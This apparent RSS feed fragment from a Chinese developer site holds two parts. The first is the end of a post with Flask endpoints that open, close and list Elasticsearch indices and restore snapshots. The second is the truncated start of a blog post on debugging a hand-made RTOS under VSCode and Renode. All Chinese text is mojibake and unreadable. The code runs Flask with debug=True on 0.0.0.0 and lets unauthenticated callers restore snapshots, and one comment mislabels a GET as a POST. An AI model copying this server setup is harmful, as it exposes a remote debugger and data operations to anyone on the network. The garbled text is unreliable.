                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å…³é—­ç´¢å¼• <span class="hljs-subst">{index_name}</span> å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
                failed_count += <span class="hljs-number">1</span>
                details.append({<span class="hljs-string">"index"</span>: index_name, <span class="hljs-string">"status"</span>: <span class="hljs-string">"failed"</span>, <span class="hljs-string">"error"</span>: <span class="hljs-built_in">str</span>(e)})
    <span class="hljs-keyword">return</span> jsonify({
        <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
        <span class="hljs-string">"message"</span>: <span class="hljs-string">"success"</span>,
        <span class="hljs-string">"data"</span>: {
            <span class="hljs-string">"success"</span>: success_count,
            <span class="hljs-string">"failed"</span>: failed_count,
            <span class="hljs-string">"details"</span>: details
        }
    })

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/open_individual_indices'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">open_individual_indices</span>():
    data = request.get_json()
    indices_list = data.get(<span class="hljs-string">'indices_list'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)
    <span class="hljs-string">"""
    é€ä¸ªå¼€å¯ç´¢å¼•ï¼ˆæ›´å®‰å…¨çš„æ–¹å¼ï¼‰

    Args:
        es_host (str): Elasticsearch ä¸»æœºåœ°å€
        es_port (int): Elasticsearch ç«¯å£å·
        protocol (str): åè®®ç±»å‹
        username (str): ç”¨æˆ·å
        password (str): å¯†ç 
        indices_list (list): è¦å¼€å¯çš„ç´¢å¼•åˆ—è¡¨

    Returns:
        dict: å¼€å¯æ“ä½œç»“æœç»Ÿè®¡
    """</span>
    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    success_count = <span class="hljs-number">0</span>
    failed_count = <span class="hljs-number">0</span>
    details = []

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> indices_list:
        <span class="hljs-comment"># å¼€å¯æ‰€æœ‰ç´¢å¼•</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
            url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_all/_open"</span>

            <span class="hljs-comment"># å‘é€ POST è¯·æ±‚å¼€å¯å•ä¸ªç´¢å¼•</span>
            response = requests.post(url, auth=auth)
            response.raise_for_status()

        <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¼€å¯ç´¢å¼•_allå¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
            details.append({<span class="hljs-string">"index"</span>: <span class="hljs-string">"_all"</span>, <span class="hljs-string">"status"</span>: <span class="hljs-string">"failed"</span>, <span class="hljs-string">"error"</span>: <span class="hljs-built_in">str</span>(e)})
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">for</span> index_name <span class="hljs-keyword">in</span> indices_list:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
                url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/<span class="hljs-subst">{index_name}</span>/_open"</span>

                <span class="hljs-comment"># å‘é€ POST è¯·æ±‚å¼€å¯å•ä¸ªç´¢å¼•</span>
                response = requests.post(url, auth=auth)
                response.raise_for_status()

                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æˆåŠŸå¼€å¯ç´¢å¼•: <span class="hljs-subst">{index_name}</span>"</span>)
                success_count += <span class="hljs-number">1</span>
                details.append({<span class="hljs-string">"index"</span>: index_name, <span class="hljs-string">"status"</span>: <span class="hljs-string">"success"</span>})

            <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¼€å¯ç´¢å¼• <span class="hljs-subst">{index_name}</span> å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
                failed_count += <span class="hljs-number">1</span>
                details.append({<span class="hljs-string">"index"</span>: index_name, <span class="hljs-string">"status"</span>: <span class="hljs-string">"failed"</span>, <span class="hljs-string">"error"</span>: <span class="hljs-built_in">str</span>(e)})

    <span class="hljs-keyword">return</span> jsonify({
        <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
        <span class="hljs-string">"message"</span>: <span class="hljs-string">"success"</span>,
        <span class="hljs-string">"data"</span>: {
            <span class="hljs-string">"success"</span>: success_count,
            <span class="hljs-string">"failed"</span>: failed_count,
            <span class="hljs-string">"details"</span>: details
        }
    })


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/restore_snapshot'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">api_restore_snapshot</span>():
    <span class="hljs-string">"""
    APIæ¥å£ï¼šæ¢å¤å¿«ç…§
    æ‰§è¡Œå‘½ä»¤: POST _snapshot/ali_es_backup/prd_01/_restore
    """</span>
    <span class="hljs-comment"># ä½¿ç”¨å›ºå®šçš„å‚æ•°æ¥åŒ¹é…æŒ‡å®šçš„æ¢å¤å‘½ä»¤</span>
    data = request.get_json()
    repository = data.get(<span class="hljs-string">'repository'</span>)
    snapshot =  data.get(<span class="hljs-string">'snapshot'</span>)
    indices = data.get(<span class="hljs-string">'indices'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)
    <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
    get_url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_snapshot/<span class="hljs-subst">{repository}</span>/<span class="hljs-subst">{snapshot}</span>"</span>
    post_url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_snapshot/<span class="hljs-subst">{repository}</span>/<span class="hljs-subst">{snapshot}</span>/_restore"</span>
    <span class="hljs-built_in">print</span>(get_url)
    <span class="hljs-built_in">print</span>(post_url)

    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    <span class="hljs-comment"># è®¾ç½®è¯·æ±‚ä½“ - åŒ¹é…æŒ‡å®šå‘½ä»¤çš„å‚æ•°</span>
    body = {
        <span class="hljs-string">"indices"</span>: indices
    }
    <span class="hljs-built_in">print</span>(body)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ POST è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯å’Œè¯·æ±‚ä½“</span>
        response = requests.get(get_url, auth=auth, json=body)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>
        <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">f"è·å–å¿«ç…§å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>,
            <span class="hljs-string">"data"</span>: <span class="hljs-literal">None</span>
        })

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ POST è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯å’Œè¯·æ±‚ä½“</span>
        response = requests.post(post_url, auth=auth, json=body)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>

        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">f"å¿«ç…§æ¢å¤æˆåŠŸ"</span>,
            <span class="hljs-string">"data"</span>: response.json()
        })

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">f"æ¢å¤å¿«ç…§å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>,
            <span class="hljs-string">"data"</span>: <span class="hljs-literal">None</span>
        })

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/get_all_snapshots'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_all_snapshots</span>():
    <span class="hljs-string">"""
    è·å–æŒ‡å®šä»“åº“ä¸‹æ‰€æœ‰å¿«ç…§çš„ä¿¡æ¯

    Args:
        es_host (str): Elasticsearch ä¸»æœºåœ°å€
        es_port (int): Elasticsearch ç«¯å£å·ï¼Œé»˜è®¤ä¸º 9200
        protocol (str): åè®®ç±»å‹ï¼Œé»˜è®¤ä¸º 'http'
        username (str): ç”¨æˆ·åï¼Œç”¨äºåŸºæœ¬è®¤è¯
        password (str): å¯†ç ï¼Œç”¨äºåŸºæœ¬è®¤è¯
        repository (str): å¿«ç…§ä»“åº“åç§°

    Returns:
        dict: å¿«ç…§ä¿¡æ¯
    """</span>
    data = request.get_json()
    repository = data.get(<span class="hljs-string">'repository'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)
    <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_snapshot/<span class="hljs-subst">{repository}</span>/_all"</span>
    <span class="hljs-comment"># è®¾ç½®è¯·æ±‚å‚æ•°</span>
    params = {
        <span class="hljs-string">'filter_path'</span>: <span class="hljs-string">'snapshots.name,snapshots.snapshot,snapshots.state,snapshots.start_time,snapshots.end_time'</span>
    }

    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ GET è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯å’Œå‚æ•°</span>
        response = requests.get(url, params=params, auth=auth)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>
        <span class="hljs-comment"># è¿”å› JSON å“åº”æ•°æ®</span>
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">"è·å–æˆåŠŸ"</span>,
            <span class="hljs-string">"data"</span>: response.json()
        })

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">f"è·å–ä¿¡æ¯å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>,
            <span class="hljs-string">"data"</span>: <span class="hljs-literal">None</span>
        })


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">6666</span>, debug=<span class="hljs-literal">True</span>)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VSCode + Renode è°ƒè¯•æˆ‘æ‰‹å·¥å®ç°çš„ RTOSï¼šä¸€æ¬¡å½»åº•æ”¹å˜æˆ‘å¼€å‘æ–¹å¼çš„ä½“éªŒ]]></title>    <link>https://juejin.cn/post/7580809247736643624</link>    <guid>https://juejin.cn/post/7580809247736643624</guid>    <pubDate>2025-12-08T04:43:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580809247736643624" data-draft-id="7580988382761107471" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VSCode + Renode è°ƒè¯•æˆ‘æ‰‹å·¥å®ç°çš„ RTOSï¼šä¸€æ¬¡å½»åº•æ”¹å˜æˆ‘å¼€å‘æ–¹å¼çš„ä½“éªŒ"/> <meta itemprop="keywords" content="åµŒå…¥å¼"/> <meta itemprop="datePublished" content="2025-12-08T04:43:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·938559462475"/> <meta itemprop="url" content="https://juejin.cn/user/1259367703787244"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VSCode + Renode è°ƒè¯•æˆ‘æ‰‹å·¥å®ç°çš„ RTOSï¼šä¸€æ¬¡å½»åº•æ”¹å˜æˆ‘å¼€å‘æ–¹å¼çš„ä½“éªŒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1259367703787244/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·938559462475
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:43:04.000Z" title="Mon Dec 08 2025 04:43:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æˆ‘ä¹‹å‰æ­å»ºäº†VSCode+Renodeçš„å¼€å‘ç¯å¢ƒåå¹¶æµ‹è¯•äº†ä¸€äº›ç®€å•çš„Led_Toggleç¤ºä¾‹ï¼Œåé¢æ‰“ç®—ç”¨å®ƒæ¥å¼€å‘ä¸€äº›å¤æ‚çš„åŠŸèƒ½ï¼Œæ¯”å¦‚RTOSçš„å®ç°ã€‚</p>
<p>ä¹‹åæˆ‘ç”¨ä¸¤å‘¨çš„æ—¶é—´å®ç°äº†ä¸€ä¸ªç®€å•çš„RTOSæ¨¡å‹ï¼Œä¸»è¦çš„ç›®çš„ï¼šç†Ÿæ‚‰ä½¿ç”¨ <strong>VSCode + Renode</strong> çš„å¼€å‘æ–¹å¼å’ŒåŠ å¼ºå¯¹RTOSçš„äº†è§£ã€‚ è¿™ä¸€æ¬¡å°è¯•ï¼Œè®©æˆ‘ç¬¬ä¸€æ¬¡æ„Ÿå—åˆ°ï¼š</p>
<blockquote>
<p><strong>è°ƒè¯• RTOS ä¸ä¸€å®šéœ€è¦å¼€å‘æ¿ã€‚</strong> <strong>VSCode + Renode å¯ä»¥æŠŠåµŒå…¥å¼ç³»ç»Ÿè°ƒè¯•å˜å¾—åƒåº”ç”¨å±‚è½¯ä»¶ä¸€æ ·ä¸æ»‘ã€‚</strong></p>
</blockquote>
<p>æˆ‘æˆåŠŸåœ¨ Renode ä¸Šï¼š</p>
<ul>
<li>å•æ­¥è¿›å…¥ PendSV</li>
<li>è§‚å¯Ÿä»»åŠ¡åˆ‡æ¢å…¨è¿‡ç¨‹</li>
<li>åˆ†æ PSP/MSP çš„åˆ‡æ¢</li>
<li>æŸ¥å‡ºé“¾è¡¨æ’å…¥é”™è¯¯å¯¼è‡´çš„ UsageFault</li>
<li>å®šä½ BASEPRI è®¾ç½®ä¸å½“å¯¼è‡´çš„æ–­è¨€</li>
<li>å¤ç° pxIndex é”™è¯¯å¯¼è‡´çš„ä»»åŠ¡è°ƒåº¦æ··ä¹±</li>
</ul>
<p>ä¸‹é¢æ˜¯å®Œæ•´çš„ç»éªŒåˆ†äº« + å›¾ç¤ºï¼Œå¸®åŠ©ä½ ä¹Ÿèƒ½å¿«é€Ÿæ­å»ºè¿™å¥—â€œç°ä»£åŒ–åµŒå…¥å¼è°ƒè¯•ç¯å¢ƒâ€ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F11cookies11%2FRtosOfArm.git" target="_blank" title="https://github.com/11cookies11/RtosOfArm.git" ref="nofollow noopener noreferrer">é¡¹ç›®æºç (RTOSOfArm)</a></p>
<h2 data-id="heading-0">1. ä¸ºä»€ä¹ˆç”¨ VSCode + Renode è°ƒ RTOSï¼Ÿ</h2>
<h3 data-id="heading-1">âœ” å®Œå…¨ä¸ä¾èµ–ç¡¬ä»¶</h3>
<p>å®Œå…¨è½¯ä»¶åŒ–ï¼Œæ‰€æœ‰è¡Œä¸ºå¯å¤ç°ï¼Œè°ƒåº¦è¿‡ç¨‹å¯å•æ­¥ã€‚</p>
<h3 data-id="heading-2">âœ” è°ƒ RTOS ç‰¹åˆ«åˆé€‚</h3>
<ul>
<li>æŸ¥çœ‹ PendSV</li>
<li>æŸ¥çœ‹ PSP/MSP</li>
<li>æŸ¥çœ‹ BASEPRI</li>
<li>æŸ¥çœ‹é“¾è¡¨ç»“æ„</li>
<li>æŸ¥çœ‹å¼‚å¸¸å †æ ˆ</li>
<li>è·Ÿè¸ª SVC è°ƒåº¦ è¿™äº›åœ¨çœŸå®ç¡¬ä»¶ä¸Šè°ƒèµ·æ¥éå¸¸ç—›è‹¦ã€‚</li>
</ul>
<h3 data-id="heading-3">âœ” å¯é‡å¤ã€å¯å›æ”¾</h3>
<p>åŒæ ·çš„ ELF æ¯æ¬¡éƒ½èƒ½å¤ç°åŒæ ·çš„ bugï¼Œä¸åƒç¡¬ä»¶é‚£æ ·å—å¤–ç•Œå¹²æ‰°ã€‚</p>
<h2 data-id="heading-4">2. å·¥ç¨‹ç»“æ„ç¤ºæ„å›¾</h2>
<ul>
<li>æ ¹ç›®å½•</li>
<li>apps/</li>
<li>blinky/ï¼šæ¼”ç¤ºä»»åŠ¡ï¼ŒTask1/Task2 äº¤æ›¿æ‰“å°ä¸²å£ï¼ŒéªŒè¯ tick ä¸è°ƒåº¦</li>
<li>ports/</li>
<li>arm-cortex-m/ï¼šä¸Šä¸‹æ–‡åˆ‡æ¢ã€SysTickã€PendSV é…ç½®</li>
<li>rtos/ï¼ˆå­æ¨¡å—ï¼‰</li>
<li>config/ï¼šRTOS é…ç½®</li>
<li>source/ï¼šä»»åŠ¡ã€é“¾è¡¨ã€ä¸´ç•ŒåŒºåŸºç¡€è®¾æ–½</li>
<li>renode/</li>
<li>platform.rescï¼šRenode å¹³å°æè¿°ï¼ŒåŒ…å« GDB æœåŠ¡å™¨ç«¯å£</li>
<li>.vscode/</li>
<li>tasks.json / launch.jsonï¼šæ„å»ºã€ä¼ è¾“ã€å¯åŠ¨ Renodeã€GDB è¿æ¥çš„ä¸€é”®é“¾è·¯</li>
</ul>
<h2 data-id="heading-5">3. VSCode + Renode è°ƒè¯•æµç¨‹ç¤ºæ„</h2>
<p>ä¸‹é¢è¿™å¹…å›¾å¯ä»¥å¸®åŠ©ä½ ç†è§£æ•´ä¸ªæµç¨‹ï¼š</p>
<p>æµç¨‹éå¸¸é¡ºæ»‘ï¼š</p>
<ol>
<li>VSCode è°ƒç”¨ CMake ç”Ÿæˆ firmware.elf</li>
<li>è‡ªåŠ¨è¿è¡Œ Renodeï¼ˆå¯åŠ¨ CPUã€å¤–è®¾ã€å†…å­˜ï¼‰</li>
<li>Renode æ‰“å¼€ GDB Server</li>
<li>VSCode è‡ªåŠ¨ attach åˆ° 3333</li>
<li>ç¨‹åºåœåœ¨ Reset_Handler</li>
<li>ä½ å°±å¯ä»¥å¼€å§‹å•æ­¥è°ƒåº¦å™¨äº†</li>
</ol>
<p>å°±æ˜¯è¿™ä¹ˆâ€œç°ä»£â€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f530313d9afe41c2befb4f10ce3fd5e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3OTM4NTU5NDYyNDc1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765773783&amp;x-signature=g0HWMHeMf%2BYCWfw3n7yzdW1oEv0%3D" alt="ssh_renode.jpg" loading="lazy"/></p>
<h2 data-id="heading-6">4. RTOS è°ƒè¯•ä¸­æœ€å…³é”®çš„å‡ ä¸ªå›¾ç¤º</h2>
<p>ä¸ºäº†è®©å†…å®¹æ›´ç›´è§‚ï¼Œç»“åˆæˆ‘è°ƒè¯•æ—¶çœŸæ­£é‡åˆ°çš„é—®é¢˜ï¼Œæ•´ç†å‡ºäº†å‡ ä¸ªé—®é¢˜å’Œä½¿ç”¨renodeè§£å†³é—®é¢˜çš„ä»‹ç»ã€‚</p>
<h2 data-id="heading-7">4.1 PendSV ä»»åŠ¡åˆ‡æ¢ï¼ˆé‡ç‚¹ï¼‰</h2>
<p>PendSV æ˜¯ RTOS è°ƒåº¦çš„æ ¸å¿ƒï¼ŒRenode å…è®¸æˆ‘ï¼š</p>
<ul>
<li>å•æ­¥è¿›å…¥ PendSV</li>
<li>çœ‹æ¯æ¡æŒ‡ä»¤</li>
<li>çœ‹å¯„å­˜å™¨å‹æ ˆ/å‡ºæ ˆ</li>
<li>çœ‹ PSP/MSP åˆ‡æ¢</li>
<li>çœ‹ç¬¬ä¸€ä¸ªä»»åŠ¡å¦‚ä½•å¯åŠ¨</li>
</ul>
<p>å®æœºå¾ˆéš¾åšåˆ°å¦‚æ­¤æ¸…æ™°ã€‚ æˆ‘åœ¨æ˜¯ä½¿ç”¨PendSVCå®ç°ä¸Šä¸‹æ–‡ä¿å­˜å’Œæ ˆåˆ‡æ¢çš„æ—¶å€™ï¼Œç”±äºä»£ç ä¸­è®¿é—®é”™äº†å¯„å­˜å™¨åœ°å€ï¼Œåœ¨é”™è¯¯æ—¶åº(rtosåˆå§‹åŒ–è¿˜æ²¡æœ‰å®Œæˆ)çš„æ—¶å€™è§¦å‘äº†PendSVCï¼Œå¯¼è‡´ä»PendSVCä¸­è¿”å›çš„æ—¶å€™ï¼Œå¾€PSPä¸­å¤åˆ¶äº†é”™è¯¯çš„ä¿¡æ¯ï¼Œç³»ç»Ÿè·‘é£ã€‚<strong>ç¡¬ä»¶å®æœºå¾ˆéš¾å‡†ç¡®æ•æ‰åˆ°é”™è¯¯è§¦å‘æ—¶åˆ»çš„ä¸Šä¸‹æ–‡</strong>ï¼Œä½†é€šè¿‡renodeï¼Œæˆ‘<strong>å¯ä»¥å‡†ç¡®çš„å‡†ç¡®å¤ç°é—®é¢˜ï¼Œå¹¶é€šè¿‡å†…æ ¸å¯„å­˜å™¨é€æ­¥æ‰¾åˆ°é—®é¢˜æ‰€åœ¨</strong>ï¼›</p>
<h2 data-id="heading-8">4.2 Cortex-M ä»»åŠ¡åˆ‡æ¢å †æ ˆ</h2>
<p>Cortex-M çš„æ ‡å‡†å¼‚å¸¸å †æ ˆæ„æˆæ˜¯ï¼š</p>
<ul>
<li>xPSR</li>
<li>PC</li>
<li>LR</li>
<li>R12</li>
<li>R3/R2/R1/R0</li>
